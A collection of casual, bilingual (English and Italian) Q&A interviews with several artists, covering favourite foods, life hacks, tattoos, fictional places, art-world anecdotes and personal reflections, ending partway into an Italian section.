I read Mary Beard, a text she published in a book called The Voice Of Women or something. It’s quite an easy read, she traces how in classical and historical literature, women’s voices are not heard, like in the stories women’s voices were already muted. Things in that book are very relatable, in terms of feeling heard, talking and feeling comfortable or not. And sometimes I use speech in performance, and I notice how difficult I find it it to do that, like to have your voice and really use it, to actually let it take space. I was interested in this because I was doing this work with a mermaid and the mermaid’s story of her exchanging her voice in order to get legs, so her tongue is cut out and she can’t speak anymore.
Screenshot from the video: ‘She didn’t know what to say before she lost her tongue
tail’, 2018.
If you could perform with any historical figure who would it be ?
My grandma.
Don’t know if that is historical,
She passed away though maybe that makes it historical.
Not sure if it would work out actually, she is quite dry and clear-headed. She had a no nonsense character, and never really understood the art things I was doing. Wasn’t really interested either I think. But she was cool, I see her as a very strong person, with a mind of her own. I wouldn’t do a performance with her, but maybe I could see a video happening. But yeah I find it a difficult question as it sort of implies the other persons consent/ interest in this without asking them. I find that very important when you do a collaboration, or work with other people their consent. But there is definitely a tension field because even when they have committed to be in a work, I can’t always control all the conditions of where and when it is shown.
Can you show us the last 3 exhibition photos from your phone?
From the exhibition ‘Home Futures’ at the Design Museum
The first photo wasn’t allowed. It is from a maquette of the film set of ‘Mon Oncle’ by Jacques Tati which is one of my favourite films.
Something you are really good at?
Hmmm..maybe eating breakfast? Like, some people skip breakfast and I don’t understand. Yea maybe it’s because I grew up where in my family we all had breakfast together in the morning before everybody rushed off…and, my parents are quite smart, on Sundays I made breakfast for everybody and then we all ate it in their bed and watched TV, there’s this specific dutch TV program for kids. My parents, they wanted their eggs boiled but soft, so I was really good in the timing of the eggs.
A like hack for us?
I don’t think it really makes my life easier but I like doing it: I like putting spaghetti and holding them all in my hand in the middle of the pot and if you suddenly open your hand the spaghetti falls quite nicely in a circle.
A reflection or question from you?
Sometimes I wonder what people do to settle their minds to just relax or before they fall asleep. I am someone who can really worry before falling asleep and I need to chill before I go to sleep. So maybe the question is: how do you do to switch off? In my case, I just start reading a novel before going to bed, or otherwise during the day if I need to switch off, I really like going to the market, or I love to take a bath haha…I have a bath here in London but also have 3 other flatmates and there is always somebody who needs to use the toilet.

Se potessi prendere un farmaco che ti mantenesse in forma come se facessi dello sport, lo prenderesti?
No, mi piace fare sport. Penso che mi faccia bene al cervello, e penso che sia una buona forma di meditazione, non faccio sport per essere in forma ma per sentirmi bene, per mantenermi sana di mente. E mi aiuta a entrare nel mio corpo, cambiare i miei pensieri e apprezzare la mia fisicità. In verità, pur dicendo questo, non è che faccia cosi tanto sport, magari un paio di volte a settimana ma non sono mai stata in palestra haha.
Se dovessi scegliere un oggetto sentimentale dalla tua stanza da salvare in un incendio (non il computer o elettronici), cosa salveresti?
Cavolo è difficile, sono super legata alle cose. Magari una pianta? Ma una delle mie piante sta morendo, così triste. Ma sto pensando, sono sotto pressione e in panico e questa è l’unica cosa a cui riesco a pensare.
Questa pianta è cresciuta da un ritaglio che ho rubato da un atrio d’ingresso in un edificio di lusso a Londra. Stava crescendo bene all’inizio quando improvvisamente una mela gli è caduta addosso e in un certo senso è morta. Solo di recente ha ripreso a crescere, e da allora mi piace molto.
Cos’è la prima cosa che fai quando ti svegli?
Metto ritarda sulla sveglia e torno a dormire! Quella è la prima cosa. Una volta fuori dal letto faccio la doccia e colazione. O sì, controllo il mio telefono perchè mi aiuta a svegliarmi ma a volte mi rende nervosa… del tipo che vedi una mail e pensi ‘merda!’… ma ho delle difficoltà a uscire dal letto quindi questo è un buon modo per tirarmi fuori dal letto.
Se potessi usare solo una parola per il resto della giornata quale sarebbe?
Questo è difficile. Penso ‘hey’, Si può usare con varie intonazioni, come heeeey o hEi haha.
Londra o Amsterdam?
Oh questa è malvaggia. Penso Londra but non penso che lo sarà per sempre. Per me ora vivere a Londra mi stimola ma il mio ragazzo abita a Amsterdam… Alcuni miei amici stanno tornando a Amsterdam, perché erano andati via ma tornano e a loro piace, penso di essere ancora molto legata ad Amsterdam.
L’ultima cosa che hai letto e che ti è rimasta impressa?
Ho letto Mary Beard, un testo che ha pubblicato in un libro che si chiama tipo The Voice Of Women o qualcosa del genere. È una lettura facile, rintraccia come nella letteratura classica or storica, già le voci delle donne erano mute. Mi identifico nelle cose in questo libro, in termini di essere sentita o ascoltata, parlare e sentirsi a suo agio oppure no. E a volte uso la parola nelle mie performance, e noto quanto sia difficile per me farlo, nel senso di veramente avere la propria voce, usarla e lasciarla prendere spazio. Mi sono interessata a questo perché sto facendo un lavoro con le sirene e la storia della sirena che scambia la sua voce per delle gambe e si fa tagliare la lingua perciò non può più parlare.
Screenshot del video: ‘She didn’t know what to say before she lost her tongue tail’, 2018.
Una persona storica con cui vorresti fare una performance?
Mia nonna.
Non so se questo è storica.
E morta perciò la rende un po’ storica.
Non so se funzionerebbe, è abbastanza secca e chiara di mente. Aveva un carattere no-nonesense, e non capiva mai veramente le cose d’arte che io facevo. Ma era cool, la vedo come come una persona molto forte, con una mente tutta sua. Non farei una performance con lei, ma magari un video happening. Ma penso che sia una domanda difficile perché implica il consenso e l’interesse dell’altra persona senza chiederglielo direttamente. Penso che sia molto importante quando si fa una collaborazione. Ma c’e sempre un campo di tensione anche quando hanno dato il consenso di essere in un lavoro, non posso controllare tutte le condizione di dove e quando e mostrato.
Ci puoi mostrare le 3 ultime foto di mostre nel tuo telefono?
Dalla mostra ‘Home Futures’ al Design Museum di Londra.
La prima non era permessa, era di una maquette del film ‘Mon Oncle’ di Jaques Tati, che è uno dei miei film preferiti.
Un life hack per noi?
Non so se questo mi facilita la vita ma mi piace farlo: mettere gli spaghetti e tenerli tutti in mano al centro della pentola e quando apro la mano gli spaghetti cadono in un bel cerchio.
Una riflessione o domanda da parte tua?
A volte penso a come fa la gente per svuotare la mente o come si rilassa prima di andare a letto. Sono il genere di persona che si preoccupa prima di andare a dormire quindi ho bisogno di rilassarmi coscientemente. Quindi la domanda magari è: Cosa fai per staccare? Nel mio caso, prima di andare a leggere leggo un libro, se no durante il giorno mi piace andare al mercato, o mi piace fare un bagno haha… Ho una vasca da bagno qui a Londra ma ho anche tre altri coinquilini e c’è sempre qualcuno che deve usare il bagno.

What is the most competitive thing that you have trained for?
It’s for a Michael Jackson, Billie Jean dance. This happened like 10 years ago, Oh yes this year is 10 years anniversary of his death. It was competitive but for myself because that was the first time I performed in front of people. It was in my university, at the end of the year, there was a big celebration and I applied to do my performance. I wasn’t very satisfied with it..90% of it was a bedroom and garage performance.
An image that has had a big influence on your art practice?
I think I’ve had influences over time but recently I just saw that in Australia they make Pizza Pho (a traditional Vietnamese noodle soup). At the time I was a little bit confused because I currently live in Italy and I always make fun of my Italian friends because they are so religious about food, and so just seeing Pho on Pizza… I don’t know if it tastes good, if it tastes good then for me it’s ok. It really made me question my thinking, whether I’m liberal enough or whether I’m conservative. I think food is one of the last borders we need to overcome.
Can you describe what you’re currently working on in 4 words?
fusion – sexual – propaganda – design
What’s your favourite traditional holiday?
The Vietnamese new year, like the lunar new year, I like it because I get free time to work on other stuff or some time for myself, you have 7 days to do things you like and you don’t have to rush. I am not a fan of holidays, somehow is it necessary? I am a workaholic. The new year dates change every year, I don’t know when it is, when I’m in Vietnam it’s my family’s duty to tell me when it is haha. Yea, because I did freelance jobs in Vietnam so for me there was no holiday after all.
If you were one of 10 human beings chosen to go live on Mars would you go?
I would. Definitely. I love new places, so yeah. You question doesn’t imply that I need to stay there… but Iive, like stay there for 1 or 2 years, for me it’s fine. I don’t like holidays, so I don’t go to Mars to do holidays, but I’ll go there and live and it’s fine.
What fruit or vegetable would you most like to be?
Oh…eggplant. Melanzana. When I came to Italy I found that the way Italians cook melanzana is really nice. When we cook it in Vietnamese food, we make a soup out of it and it makes the eggplant fluffy and soft and I don’t like it. But when you cook it in cubes or fried somehow it tastes like meat and it absorbs a lot of spice. It doesn’t taste of chicken skin but sometimes the feeling is similar.
Your favourite vehicle?
A motorbike, my motorbike, like a Super Cub that my father gave to me when I was born. In 1989 when I was born my father bought this motorbike then when I was in my second year in university I asked him about the bike and he explained everything about it and changed everything on it to my style. It’s been my bike for the last 10 years.
If you were allowed only 3 apps on your phone, which ones would they be?
Definitely Instagram, then Facebook and Messenger. Oh no, I would changed Messenger for Google Photos because it has my photos for the past 3 years.
Life hack for us?
You can actually replace panna da montare with cooking coconut cream, following the same recipe: http://www.gustoblog.it/post/188758/pasta-gamberetti-panna-ricetta-appagante
Approved by my Sicilian roomate.
A question or a reflection?
I’ve been thinking and reading some articles about when you do sports or have sex, your brain produces some kind of drug or chemical that you can use, so I was thinking about this scenario in the future and how rich people could afford to hire poor people to produce this drug this biological drug (when it’s inside your body it’s defined chemical but outside the body it’s defined a drug). So selling your pleasure to a higher price. People now are doing a lot of things at the same time and they do not have time to pleasure themselves, such as doing sports to keep the body fit, for me when I do sports it’s not about keeping fit but more relaxing myself. But would I consider taking a drug so that I don’t have to do sports anymore? (that it’s good because it’s bio and doesn’t have effects on the long term)
21.02.19 giang.it	
La cosa più competitiva per la quale ti sei allenato?
È per una danza che ho fatto su Michael Jackson Billie Jeans. È successo tipo 10 anni fa, Ah si quest’anno è l’anniversario di 10 anni della sua morte. Non competizione con me stesso perché era la prima volta che facevo una rappresentazione davanti a della gente. Era nella mia università, per una rappresentazione di fine anno, c’era una grossa celebrazione per la quale ho fatto un application e ho mostrato questa performance.Non ero molto soddisfatto…Era a 90% una performance da stanza o da garage.
Un’immagine che ha avuto una grossa influenza sulla tua pratica?
Penso di aver avuto tante influenze nel tempo me di recente ho visto che in Australia fanno la Pizza Pho (una zuppa tradizionale vietnamita). Al tempo mi ha lasciato un po’ confuso perché al momento abito in italia e prendo sempre in giro i miei amici perché sono super religiosi per il cibo, e poi ho visto il pho sulla pizza…Non so se è buona, se è buona allora per me va bene. Mi ha veramente fatto riflettere sui miei pensieri, se sono progressivo abbastanza o se sono conservatore. Penso che il cibo sia una delle ultime frontiere da abbattere.
Puoi descrivere un tuo progetto attuale in 4 parole?
fusione – sessuale – propaganda – design
Cos’è la tua vacanza tradizionale/festività preferita?
Il nuovo anno vietnamita, come il nuovo anno lunare, mi piace perché mi da tempo libero per lavorare su altre cose e un po di tempo per me stesso, hai 7 giorni per fare quello che ti piace e non devi essere di fretta. Non sono molto fan di vacanze, in un certo senso mi chiedo se sono necessarie? Sono un patito di lavoro. Le date del nuovo anno cambiano ogni anno, non so quando è, ma quando sono in Vietnam è il dovere della mia famiglia di dirmi quando è haha. Si, perché facevo dei lavori freelance in vietnam quindi per me non era mai vacanza alla fine.
Se fossi 1 di 10 esseri umani scelti per andare su Marte, andresti?
Andrei. Sicuramente. Adoro posti nuovi quindi si. La vostra domanda non implica che devo rimanere lì…ma rimanere lì per 1 o 2 anni, per me va bene. No mi piacciono le vacanze, quindi non vado su marte per le vacanza, ma per viverci e va bene.
Quale frutta o verdura vorresti essere?
Oh…la Melanzana. Quando sono venuto in Italia ho visto che si cucina in modi buonissimi. Quando la cuciniamo in Vietnam, la mettiamo dentro alle zuppe, questo la rende soffice e morbida e non mi piace. Ma quando si cucina a cubetti o fritta, in qualche modo assomiglia alla carne e assorbe tante spezie. Non ha il gusto delle pelle del pollo ma a volte la sensazione è simile.
Il tuo veicolo preferito?
Una moto, la mia moto, una super cub che mi ha dato mio padre quando sono nato. Sono nato nel 1989 e mio padre ha comprato questa moto, poi quando ero nel mio secondo anno di università gli ho chiesto la moto, mi ha spiegato tutto su quella moto e l’ho cambiato i pezzi per farla diventare più il mio stile. E stata la mia moto per gli ultimi 10 anni.
Se potessi scegliere soltanto 3 apps sul tuo telefono, quali sarebbero?
Di sicuro Instagram, poi Facebook e Messenger. Ah no, cambierei messenger per google photos perché ha tutte le mie foto degli ultimi 3 anni.
Un life hack per noi?
Si può rimpiazzare la panna da montare cone la crema di cocco per cucinare seguendo questa ricetta: http://www.gustoblog.it/post/188758/pasta-gamberetti-panna-ricetta-appagante
Approvata dalla mia coinquilina siciliana.
Una domanda o una riflessione da parte tua?
Stavo pensando e ho letto un paio di articoli sulle sostanze chimiche o le droghe che produce il cervello quando stiamo facendo esercizio o facendo sesso, e stavo immaginando questo scenario nel futuro e come gli ricchi potrebbero pagare della gente povera per produrre questa droga biologica (quando e dentro al corpo si chiama sostanza chimica ma quando e fuori dal corpo si definisce una droga). Quindi vendere il piacere a un prezzo elevato. La gente ora sta facendo tante cose in contemporanea e quindi non hanno il tempo di farsi piacere, come fare ginnastica per mantenersi in forma. Per me quando faccio sport non e per stare in forma ma per rilassarmi. Ma prenderei una droga per evitare di fare sport? (che e buona perché è bio e non ha effetti a lungo termine)

Do you think tattoos age well?
Uhmm, I think it really depends on the tattoo and where it is tattooed. I don’t have a tattoo.
Would you get one?
I think I’d only get a tattoo when I’m successful enough to get a good one on my face.
If you were to listen to one song for the rest of our life which one would it be?
It’s a good question. There’s a song by the cinematic orchestra called ‘breathe’ and I think it would be this because it kind of calms me down. It’s one of the few things I can play that has an instant calming effect on me so when, I get stressed or feel vulnerable I would be able to still use it.
Would you rather be a bit late or super early?
I think super early, definitely. I need to scope out the surroundings, I need to know where the exits are, I need to have a few plans of escape ready haha. You can never be too early!
If you were to invent a mythological creature how would it be?
Oh that’s cool! I think it would be some kind of lemon animal. I’d make up some animal that is based on lemons and have the superpowers of a lemon. It could have the power of being acid, of burning things but also clean and making things smell nice, it can also make nice drinks and give people lemonade. I don’t know if one like this exists…
Are you still making work with lemonade?
I tend to still use lemons in my work yea… but I haven’t developed anything new so I just make lemonade. I like the salty one, it’s kind of like a South Indian style Nimbu Pani.
Like those ones in the glass bottles with the little glass ball as a seal they sell is some places in India?
Yea I know this system! It was actually invented by a British professor, he’s from Brixton in South London. This ball system, it was exported to India during the colonial times and it dies out everywhere else except for in India. You can still find some of these bottles in antique shops. If I find one, I’ll get it for you!
Any new year’s resolutions?
I think I have an idea where I want to train towards an artistic practice like training to be a boxer or an MMA fighter. I’m interested in the process of training to fight without the fighting aspect. Like how the psychology of a fighter can be applied to something completely different. I’m interested in the physical processes it involves, going to the gym, training, doing these activities as a ‘​Technique of the Self​’ but the outcome is never to fight and never to step into a ring but to do an artwork or something really mundane. For instance, I could do all this training and then sit down and be like ‘ok, I’m going to write an artist statement, I’m gonna attack the paper, albeit gently’ and to have this mentality throughout. As you can tell, I’m still developing the idea but it comes from observing people that are into boxing and fighting, something I had to contend with growing up, but now it functions as more of a curiosity.
The last thing you read that made you laugh?
You know what, there’s a page on Instagram, you probably know it: @braininthefrontseat. It’s like memes to do with art and it’s hilarious. There are lots that mention things like ‘research-based practices’ and on how these artists are just always on holiday.
A cringeworthy art world moment?
I feel there are so many…Yea OK, so I sort of entered the art world officially back in 2017, when
I was selected to be in the Diaspora Pavilion in Venice. I came from a background in medicine and community work, so I didn’t know what certain people looked like. So there I was, setting up my work in the pavillion and Isaac Julien walks in. He was asking me about my installation, saying that he liked it and wanted me to tell him more about it. For some reason I didn’t realise it was him at the time, so I just said ‘those guys over there are talking about ​Diaspora​, but my work is about the next generation and we are the NEO-DIASPORA, so it’s about the future and algorithms… blah blah blah’ – it was very dismissive and he just laughed and walked away! Then someone else came up to me and said ‘hey, that’s Isaac Julien, you can’t talk to him like that’ and I responded that ‘I didn’t realise it was him and I wasn’t really that fussed at the time because I was trying to work out my install.’ In any case, I later found out that he thought the whole exchange was hilarious and loved my sense of indifference in an environment where he is rarely unrecognised. Then at the opening of the show when he was speaking to the public he mentioned my concept of NEO-DIASPORA but attributed it instead to ‘Paul Maheke’ hahah! I was with Paul at the time and he promised that he hadn’t used this phrase with Isaac, so we just laughed about the absurdity of the whole scenario.
Butter or oil?
Always butter. Well no, actually I’d say together, because butter burns quickly so if you add oil you can have it at a higher temperature and still get the flavour. I used to be a chef so I know these tricks!
Life hack for us?
I think my favourite life hack is: learn how to chop very well. Learn how to chop like a show-off chef. I’ve done workshops where I teach people how to chop a courgette for example. It’s very impressive, you can use it to show off, or you can put videos of you chopping on instagram and it gets people excited, I’ve done this and it works really well. It’s a life hack that helps you to cook quickly so you can eat proper food. And you need to use a good knife. It’s much safer to use a sharp knife than a blunt one because it doesn’t slip, fun fact!
A question or something you’ve been asking yourself lately?
It’s kind of like what I’ve been reflecting on in my new year’s resolutions: could training for a fight without the fighting be a form of practice? I don’t know how to phrase the question
really..but maybe: What is the most competitive thing that you have trained for, that requires a very competitive attitude? For instance, I played pool in tournaments when I was younger and I was quite good in my area, I won a couple of tournaments. I also used to be a goalkeeper, I played football semi-professionally. It was for very short period and came from my time in school when I used to be a goalkeeper because nobody else wanted to. I was the only person that could dive on concrete, it was crazy but everyone thought it was great. I used to get a thrill from the sense of risk but it wasn’t a sustainable career path… if only I’d known of Bas Jan Ader back then!

Pensi che i tatuaggi invecchino bene?
Mmmm, penso che dipende da cosa sia il tatuaggio e di dove si trova sul corpo. Io non ho un tatuaggio.
Ne faresti uno?
Penso che mi farei un tatuaggio solo quando avrò abbastanza successo per farmene uno in faccia.
Se dovessi ascoltare una canzone per il resto della tua vita, quale sarebbe?
È una bella domanda. C’è una canzone di The Cinematic Orchestra che si intitola ‘Breathe’ e penso che sarebbe questa perché mi tranquillizza. È una della poche cose che posso ascoltare che ha un effetto rilassante su di me, quindi quando sono stressato e devo ascoltare una cosa, ascolto quello.
Preferisci essere un po’ in ritardo o super in anticipo?
Penso super in anticipo, sicuramente. Ho bisogno di capire i dintorni, devo sapere dove sono le uscite di sicurezza, devo avere alcuni piani di evasione pronti haha. Non si può mai essere troppo in anticipo!
Se dovessi inventare una creatura mitologica, come sarebbe?
Ah che figo! Penso che sarebbe una specie di animale limone. Creerei una specie di animale che si basa su limoni e che ha i superpoteri di un limone. Potrebbe avere il potere di essere acido, di bruciare cose ma anche di fare avere un buon odore, potrebbe creare delle bibite e dare alla gente delle limonata. Non so se esiste una cosa del genere…
Stai ancora facendo lavori con la limonata?
Tendo ancora a usare limoni nel mio lavoro sì…ma non ho sviluppato niente di nuovo quindi continuo a fare delle limonata. Mi piace quella salata, del tipo della del sud dell’India che si chiama Nimbu Pani.
Conosci quelle bottiglie di vetro con il tappo a forma di pallina di vetro che usano in certi luoghi in India?
Si conosco quel sistema! È stato inventato da un professore di Brixton, nel sud di Londra. Ed é un sistema che è stato esportato in india nel tempi del colonialismo. E non esiste piú da nessuna parte a parte in India. Vendono queste bottiglie in dei negozio di antiquariato qui, se ne vedo una ve la compro!
Hai dei buoni propositi per il nuovo anno?
Si penso di avere un idea di voler allenarmi per la mia pratica artistica come lo fa un pugile o uno che combatte nel MMA. Sono interessato nel processo di allenamento per lottare senza l’incontro, entrando nella psicologia di un pugile e come quella può essere applicata a qualcos’altro. Sono interessato nel processo fisico che implica, andare in palestra, allenamento, fare queste attività ma l’esito non è mai combattere e andare nel ring ma invece quello di creare arte. Quindi di fare tutto questo allenamente e poi sedersi e dirsi ‘ok, ora scrivo il mio statement artistico, ora aggredisco il foglio’ e di avere questa mentalità. Penso che il mio proposito del nuovo anno è di diventare un pugile che combatte ma senza i combattimenti. Sto ancora sviluppando questa idea ma proviene dall’essere circondati da altri interessati alla boxe, non lo ero mai ma sto diventando molto curioso.
L’ultima cosa che hai letto che ti ha fatto ridere?
Sapete cosa, c’è una pagina su instagram, la conoscete magari: braininthefrontseat. Sono dei memes ma che hanno a che fare con l’arte, sono divertentissimi. Ce ne sono tanti sulle pratiche di ricerca e su come gli artisti che fanno ricerca non fanno praticamente niente… sono sempre in vacanza, non fanno un cazzo.
Un momento imbarazzante del mondo dell’arte?
Ce ne sono molti… Sono arrivato nel mondo dell’arte più o meno ufficialmente nel 2017 quando sono stato selezionato per il padiglione Diaspora a Venezia, quindi avevo il mio lavoro lì. Non sapevo chi fossero tante delle persone presenti e stavo installando il mio lavoro nello spazio quando entrò Isaac Julien. Mi chiese di parlare del mio lavoro, non sapevo chi fosse ma gli rispose ‘mah, voi li state lavorando sul padiglione Diaspora ma il mio lavoro è sulla neo-diaspora, quindi sto parlando del futuro, non me ne frega tanto di quello che state facendo’. Quindi l’ho praticamente mandato via, lui rise e se ne andò! Qualcun altro mi disse ‘Ei, lui è Isaac Julien, non gli puoi parlare così’ ma io rispose ‘Non so chi sia Isaac Julien, non me ne frega niente’. A lui è piaciuta la situazione e l’ha trovata buffa, raramente non viene riconosciuto perciò lo ha trovato rinfrescante. Più tardi quando ha parlato a un evento pubblico ha parlato del mio lavoro e ha nominato la neo-diaspora e faceva riferimento a me ma invece di dire il mio nome ha nominato Paul Maheke hahah! Ero con Paul in quel momento e lui mi disse ‘non ho detto niente io!’, era una situazione del gioco del telefono arabo e faceva abbastanza ridere.
Burro o olio?
Burro sempre. Anzi no, direi insieme, perché il burro brucia in fretta quindi se aggiungi dell’olio si può andare a temperature più alte. Ero un chef prima quindi conosco questi trucchi!
Hai un life hack per noi?
Si, il mio life hack preferito è: imparare a tagliare molto bene. Impara a tagliare come uno chef. Ho fatto dei workshop dove insegno a tagliuzzare una zucchina per esempio. È molto impressionante, puoi vantarti, puoi mettere dei video di te che tagli su instagram e la gente si prende bene, l’ho fatto e funzione bene. È un life hack che ti aiuta a cucinare in fretta e quindi puoi mangiare bene perche non devi comprare cibo del cavolo. Devi usare un buon coltello. È molto più sicuro usare un coltello affilato piuttosto che uno che non taglia perché può scivolare!
Una domanda che ti stai facendo ultimamente?
È quello su cui stavo riflettendo per i propositi del nuovo anno: allenarsi per il pugilato senza gli incontri può essere un lavoro d’arte? Non so come strutturare questa domanda, ma magari: Qual’è la cosa più competitiva che hai fatto per cui c’è stato tanto allenamento e un’attitudine competitiva? Io ho giocato a biliardo da piccolo nei tornei ed ero abbastanza bravo nella mia zona, ho vinto un paio di tornei. Ero anche portiere, ho giocato a calcio semi professionalmente. Era un periodo breve e ho giocato come portiere perché nessuno nella mia scuola lo voleva fare. Ed ero l’unica persona che si buttava sul cemento, ero un po’ pazzo e tutti pensavano che era una cosa fantastica. Mi piaceva un casino fare tutto ciò ma non era un piano di carriera molto sostenibile.

On what instagram profile would you like your work to be posted?
No. I don’t think there is any one. I don’t care, like I really don’t care. For me, because I’ve been off social media for this whole year…I’m just gonna backtrack and explain things. Basically last year around March I made the decision to take a year long break from showing new work and from any social media interaction or posting anything. With that I’ve realised that although social media plays a big part of my artistic identity I am not as reliant on it anymore, so I only use it in specific ways that only add to the value of my work. If anyone else wants to go ahead and post it, they can do it. Just credit me.
Blue or red?
Red, definitely. Red as a colour really really charges me. It makes me want to work. I really appreciate the colour red and also the diluted version of red is pink and as you may have noticed I have an unhealthy obsession with the color pink.
What decade do you wish you had lived in?
I wanna go to the future. I’m not really interested in the past. I think the past is great to learn from and help feed into your current situation. But like, I really wanna know if the hyperloop is gonna happen now, I wanna know if Elon Musk is the genius that everyone claims he is, you know, like that is what I’m really interested in..but also as a recent thing I wanna know if the Amazon guy (what’s his name?), what his divorce is gonna be like. Is his fortune gonna split in half or what?
Do you have a favourite tree?
Hmm…Haha I would love to just be like full on bedouin and choose a cliche tree like the palm tree, but it’s not, I don’t give a fuck about the palm tree. My favourite tree, it just hit me, it’s the mulberry tree. Growing up we had this mulberry tree behind my grandmothers house and I’d always climb it and pick all of these mulberries in the summer causing these black stains all over your feet and legs, just a magical time…mulberries stain the skin in a sort of deep pink, so beautiful, so so beautiful. Also recently I just read that mulberries can get you high if they’re not ripe. So I think I spent a majority of my childhood high as fuck!
What fictional location would you like to visit?
Omg ok! I want to go to Atlantica, little mermaid, Atlantica? Is that what it’s called? I wanna go there. I love the Little Mermaid, I’m obsessed with Ariel, I think she’s my favourite disney princess. There are a lot of interesting theories about why certain people are attracted to Ariel and specifically transgender children are attracted to her because she does not have genitalia in a way…I think…No, that is the theory, I know the theory haha!. I was always attracted to her, she was always rebellious, she didn’t give a fuck, she was like “fuck you father, I will go to the land, I don’t know their language, I don’t know what they’re doing, I’m going to use this fork as a hair brush and it’s totally fine”, which I attempted to do as a child. Forks don’t work as combs, I have learnt but I’d love to be in their world. I love Ursula, i have such appreciation for her because I feel like she’s misunderstood, for me in a way she is the super hero of the story. Ariel sometimes I love her and she like cool punk rock all of this stuff but she’s also stupid. I’m half Ariel half Ursula. In relation to that also Atlantis from the Atlantis cartoon is another place I’d love to go to, and even planet Mul, it’s the pearl planet from the movie Valerian and the city of a Thousand Planets, These fictional spaces have strong female leads in them and the fact that these worlds have such strong connections to water makes them a thousand times more fascinating to me.
So you are fascinated by the sea?
My psychic always says I get a lot of power from the sea and from the water and I always believe that is true! Hahaha. My psychic is great, he’s this CEO of a this tech company Dubai and credits his whole career to meditation. I sort of stumbled upon him randomly. He did my whole chakra reading the first day we met and told me loads of things about my previous lives.
Aside from that, i grew up in Jumeirah, which is an area that is very close to the sea, so my whole life was spent on the beach. I had my first sexual experiences on the beach in the middle of the night. it’s the place where i feel the most comfortable, the most connected, the most myself. it’s the reason i’m called Jumairy as Jumairy means “from Jumeirah”.
Would you rather live without air conditioning or without social media?
Without social media. Living in Dubai it’s hard to imagine life without an AC…and with global warming we’re really fucked, really really fucked. I choose social media for sure but if you made me choose between internet and AC I would take internet and get rid of AC. Haha, like it’s ok, I would die but at least I’d have access to all of the information i need or want.
Does your car have a name?
I actually have been thinking about that because I’m working on an artwork that related to my car. Right now it doesn’t have a name but funny enough actually [haha] the car is sometimes a ‘she’ to me (female pronouns for me) and it comes from a thing my dad used to tell me: he used to say that my car is my wife and I should not let anyone drive her. So I always thought of the car as a female in a way.
Do you have a life hack for us?
I love bukhoor, basically burning incense, in my room. Specifically frankincense. We say in the gulf that frankincense cleanses the space you’re in and also in a lot of mystic teachings it supports this idea. I carry crystals around, maybe this is just crazy me but I feel that the crystals just give me an excuse to like, be confident?! Like ‘I have my crystals, I can be an asshole today’ haha. I carry my rose quartz with me everywhere and every once in a while I change between some others. I do a lot of weird things…I tend to add turmeric to everything..turmeric in my rice, in my pasta, my tea. I also make a lot of scrubs and add turmeric, especially turmeric and coffee, it gives you a great colour!
A Question/A reflection?
Ok, I am contemplating getting a tattoo. And right now because I’m very indecisive and I really don’t like to make decisions that are gonna last forever. I think my question is not ‘what tattoos do you want to get’ but rather ‘do you think tattoos age well?’
As a tattoo I actually want to get this logo designed by my friend Tulip Hazbar for one of my artworks ‘The Sleepless Pe-Tal’ and it’s a reference to the typical pharmacy medical imagery. There is a snake and there are the wings of the eagle or whatever but if you look closer it’s all butterflies, multiple eyes in the artwork and there’s a sleeping moon too. So, I want to get that on my back, then another thing, I want the name of my first solo exhibition on my ribs ‘BRZ5’ and also a couple of other things here and there, nothing too major….but I don’t want my skin to lag later on and for my tattoos to be unidentifiable!

Su quale profilo instragram vorresti vedere il tuo lavoro pubblicato?
Non penso che ce ne sia uno. Non me ne frega, non me ne frega proprio niente. Sono stato fuori dai social media per un anno. Faccio due passi indietro e vi spiego tutto. Praticamente a marzo del anno scorso ho deciso di prendere una pausa di un anno dalle interazioni sui social media e ho anche smesso di postare qualsiasi cosa. Ho realizzato che nonostante il fatto che social hanno un ruolo importante nel mio lavoro, non ne dipendo così tanto ora. Li uso solo se può aggiunge qualcosa al valore del mio lavoro. Se qualcun altro vuole ripostare il mio lavoro, lo possono fare, basta nominarmi.
Blu o Rosso?
Rosso, definitivamente rosso. Il rosso in quanto colore mi carica, mi da voglia di lavorare. Lo apprezzo veramente come colore, e poi la versione diluita del rosso è il rosa e come avete notato, ho un’ossessione non molto sana con il colore rosa.
In che decennio ti sarebbe piaciuto vivere?
Vorrei piuttosto andare nel futuro. Non sono molto interessato nel passato. Penso che il passato sia ottimo per imparare e per farci capire meglio la nostra situazione attuale. Ma tipo, io voglio sapere se il Hyperloop succederà ora. Voglio sapere se Elon Musk è il genio di cui parlano tutti. Quelle sono le cose in cui sono veramente interessato. Ma anche questa cosa successa di recente, voglio sapere del tipo di Amazon (come si chiama?), se dopo il suo divorzio la suo fortuna sarà divisa in due o cosa?
Hai un albero preferito?
Hmm… haha mi piacerebbe essere super beduino e scegliere un albero cliché come la palma, ma non lo è e non me ne frega niente della palma. Il mio albero preferito, mi è appena venuto a mente, è il gelso. Crescendo c’era questo gelso dietro la casa di mia nonna e mi ci arrampicavo d’estate per raccogliere le more che creano queste macchie nere sui piedi e sulle gambe, dei tempi magici…le more macchiano la pelle di un rosa profondo, bello, ma proprio bello. Poi di recente ho letto che le more di gelso ti possono dare un high se non sono mature. Perciò penso di aver passato una gran parte della mia infanzia fattissimo.
Che luogo fittizio ti piacerebbe visitare?
Oh mio dio! Vorrei andare ad Atlantica, la Sirenetta, Atlantica? Si chiama cosi? Voglio andare li. Amo laSirenetta, sono ossessionato con Ariel, penso che sia la mia principessa Disney preferita. Ci sono tante teorie interessanti sul perché certe persone sono attratte ad Ariel, specificamente bambini transgender sono attratti a lei perché in un certo senso non ha genitali…penso. No, quella è la teoria, la teoria la conosco haha! Io ero sempre attratto a lei, e sempre stata ribelle, non gliene fregava niente, del tipo “vaffanculo padre, andrò a terra, non conosco il loro linguaggio, non so cosa stanno facendo, userò questa forchetta per pettinarmi i capelli ed andrà benissimo”, che ho tentato di fare da bambino. Le forchette non funzionano come pettini, ho imparato, ma mi piacerebbe comunque essere nel suo mondo. Adoro Ursula, ho un apprezzamento per lei perché sento che lei sia incompresa, per me in un certo modo è la supereroe della storia. Ariel, a volte la amo, e cool, punk rock e tutto quanto ma è anche molto stupida. Sono meta Ariel meta Ursula. In relazione a quello, anche Atlantis, del cartone Atlantis, è un altro posto in cui mi piacerebbe andare, e anche il pianeta di perle Mul dal film Valerian. Questi luoghi fittizi hanno forti personaggi principali che sono donne e il fatto che questi posti hanno forte connessioni con l’acqua li rende mille volte più affascinanti per me.
Quindi sei affascinato dal mare?
